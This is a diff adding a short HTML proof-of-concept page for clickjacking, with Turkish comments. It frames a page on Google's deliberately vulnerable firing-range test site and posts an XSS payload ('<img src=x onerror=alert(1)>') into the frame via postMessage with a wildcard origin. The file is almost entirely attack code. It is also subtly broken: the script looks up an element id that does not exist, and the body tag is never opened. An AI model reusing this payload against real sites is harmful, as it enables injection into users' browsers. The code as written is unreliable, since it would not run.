@@ -1,0 +1,23 @@
+<pre lang="JavaScript" line="1">
+<html>
+<head>
+<title>ClickJacking PoC</title>
+</head>
+ClickJacking PoC
+<h2>Your Web Application Can be Mounted within an iFrame which makes it vulnerable to ClickJacking!</h2>
+<iframe src="https://public-firing-range.appspot.com/clickjacking/clickjacking_xfo_allowall" height="450" width="1000"></iframe>
+<script>
+    var target = document.getElementById('target');
+    target.addEventListener('load', function(){ // iframe yüklendiginde 
+        var payload = {'html':'<img src=x onerror=alert(1)>'}; // bu payloadı karsı tarafa yolla (karsı tarafın bu veriyi ne yaptıgı onemli)
+        target.contentWindow.postMessage(JSON.stringify(payload),'*');// Yukarıdaki veri post meesaage ile gider 
+
+    })
+
+
+    target.src = "https://public-firing-range.appspot.com/clickjacking/clickjacking_xfo_allowall";// targetimiz
+    
+</script>
+</body>
+</html>
+</pre>
